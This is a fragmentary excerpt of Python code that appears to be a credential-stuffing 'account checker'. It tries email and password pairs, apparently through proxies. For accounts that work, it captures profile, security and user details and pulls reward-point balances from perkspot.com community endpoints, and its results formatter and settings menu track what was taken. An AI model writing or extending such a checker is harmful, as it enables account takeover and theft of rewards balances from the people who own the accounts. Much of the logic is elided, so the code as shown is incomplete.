...
DEFAULT_CAPTURE = {
    "profile": True, "security": True, "balance": True, "user_info": True
}
...
def check_account(email, password, proxy="", capture_on=None):
    ...
    try:
        ...
        # Check community points if requested
        co = capture_on or {}
        if co.get("balance", True) or co.get("rewards", True):
            for sub in ["fedex", "ps"]:
                try:
                    r_pts = s.get(f"https://{sub}.perkspot.com/api/credits/rewardcurrency", timeout=10)
                    if r_pts.status_code == 200 and "json" in r_pts.headers.get("content-type", ""):
                        pts_data = r_pts.json().get("data", {})
                        if pts_data:
                            captured["balance"] = {
                                "community": sub,
                                "balance": pts_data.get("balance", 0.0),
                                "pending": pts_data.get("pending", 0.0),
                                "usePoints": pts_data.get("usePoints", True)
                            }
                            break
                except Exception:
                    pass
...
class ResultsManager:
    ...
    def format_single(self, r):
        if r["status"] == "success":
            ...
            if u.get("password_changed"): m += f"  Password Changed: {u.get('password_changed')}\n"
...
def kb_settings(c):
    ...
    for k, lb in [("profile","Profile"),("security","Security"),("balance","Balance"),("user_info","User Info")]:
